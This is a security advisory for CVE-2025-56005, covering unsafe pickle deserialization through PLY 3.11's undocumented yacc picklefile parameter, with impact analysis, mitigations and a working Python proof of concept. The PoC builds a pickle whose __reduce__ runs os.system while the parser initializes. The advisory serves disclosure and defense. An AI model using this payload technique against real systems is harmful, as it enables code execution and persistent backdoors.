# Security Advisory — CVE‑2025‑56005

### 🚨 Undocumented Remote Code Execution in PLY via `picklefile` Parameter

**CVE ID:** CVE‑2025‑56005 (**RESERVED**)
**Reported by:** Ahmed Abdelmoumen
**Disclosure Date:** July 1, 2025
**Affected Product:** PLY (Python Lex‑Yacc)
**Affected Version:** 3.11 (PyPI distribution)
**Vendor:** PLY (Python Lex‑Yacc)
**Affected Component:** ply/yacc.py` — `LRTable.read_pickle()` via `yacc(picklefile=...)`


## Summary

An undocumented and unsafe feature in the PyPI‑distributed version of **PLY 3.11** allows **arbitrary code execution** when the `yacc()` function is invoked with the `picklefile` parameter.

The `picklefile` parameter causes PLY to deserialize a `.pkl` file using Python’s `pickle.load()` **without validation**. Because Python’s `pickle` module supports execution of arbitrary code during deserialization (e.g., via `__reduce__()`), an attacker who can control the supplied pickle file can execute arbitrary code during parser initialization.

This parameter is **not documented** in the official PLY documentation or GitHub repository, yet it is active in the PyPI release.

---

## Impact

attacker can control, replace, or influence the `.pkl` file passed to `yacc(picklefile=...)`, they can achieve:

* Arbitrary code execution
* Execution during application startup
* Code execution before any parsing logic is reached

This may affect applications that load parser tables from:

* Cached locations
* Shared directories
* CI/CD pipelines
* Configurable or writable paths

---

## 🔍 Vulnerability Details

* **Vulnerability Type:** Arbitrary Code Execution
* **Attack Type:** Context‑dependent
* **Attack Vector:** Unsafe deserialization of attacker‑controlled pickle file
* **Impact:** Code execution
* **CWE:** CWE‑502 (Deserialization of Untrusted Data)

### Affected Functionality

* `ply.yacc.yacc(picklefile=...)`
* `LRTable.read_pickle()` in `ply/yacc.py`

---

## Additional Information (Context & Risk)

This vulnerability presents elevated risk due to its **stealthy nature** and potential for **persistence**.

The `picklefile` parameter is **undocumented** in the official PLY documentation and GitHub repository. However, the PyPI‑distributed version of PLY 3.11 includes this functionality and processes the supplied file using `pickle.load()` without validation.

Because Python’s `pickle` module permits execution of embedded code during deserialization, a malicious pickle file can execute arbitrary code **during parser setup**, before any parsing logic is invoked.

At the time of writing, the maintainer has not publicly acknowledged this behavior.

This functionality can be abused to introduce **persistent backdoors**, particularly in environments where parser table files are:

* Cached on disk
* Shared between users or services
* Generated or reused in CI/CD pipelines
* Loaded from configurable or writable paths

Given the lack of documentation, silent execution path, and the high impact of unsafe deserialization, a CVE assignment is warranted to raise awareness and protect downstream users.

---

## Proof of Concept (PoC)

This proof of concept demonstrates arbitrary code execution when a malicious pickle file is supplied via the undocumented `picklefile` parameter.

### PoC Overview

The PoC:

* Defines a minimal lexer and parser
* Crafts a malicious pickle payload
* Executes a system command during deserialization

### Expected Result

When `yacc(picklefile='exploit.pkl')` is invoked, arbitrary code is executed during parser initialization.

```python
import pickle
import os
from ply.lex import lex
from ply.yacc import yacc

tokens = ('EXAMPLE',)

def t_EXAMPLE(t):
    r'example'
    return t

def p_sample(p):
    'sample : EXAMPLE'
    pass

class Exploit:
    def __reduce__(self):
        cmd = 'touch /tmp/pwned && echo "VULNERABLE" > /tmp/pwned'
        return (os.system, (cmd,))

malicious_data = {
    '_tabversion': '3.11',
    '_lr_action': {0: {}},
    '_lr_goto': {0: {}},
    '_lr_productions': [
        (None, 0, 0, 0, Exploit())
    ],
    '_lr_method': 'LALR'
}

with open('exploit.pkl', 'wb') as f:
    pickle.dump(malicious_data, f)

parser = yacc(picklefile='exploit.pkl', debug=False, write_tables=False)
parser.parse('example')
```

---

## Mitigation

* Do **not** use the `picklefile` parameter with untrusted or externally writable files
* Avoid loading parser tables from user‑controlled locations
* Treat all pickle files as **unsafe input**
* Prefer regenerating parser tables rather than loading them from disk

---

## CVE Status

This issue is tracked as **CVE‑2025‑56005** and is currently **RESERVED**.

The CVE entry will be updated once a public advisory reference is finalized and submitted to MITRE.

---

## References

* PLY GitHub Repository: [https://github.com/dabeaz/ply](https://github.com/dabeaz/ply)
* PyPI Package: [https://pypi.org/project/ply/](https://pypi.org/project/ply/)
* Python Pickle Documentation: [https://docs.python.org/3/library/pickle.html](https://docs.python.org/3/library/pickle.html)
* Proof of Concept Repository:
  [https://github.com/bohmiiidd/Undocumented-RCE-in-PLY](https://github.com/bohmiiidd/Undocumented-RCE-in-PLY)

---

### ✔️ Maintainer / CNA Notes

This advisory is published to document the observed behavior in the PyPI distribution of PLY 3.11 and to raise awareness of the security implications of unsafe deserialization via undocumented functionality.


Just tell me.
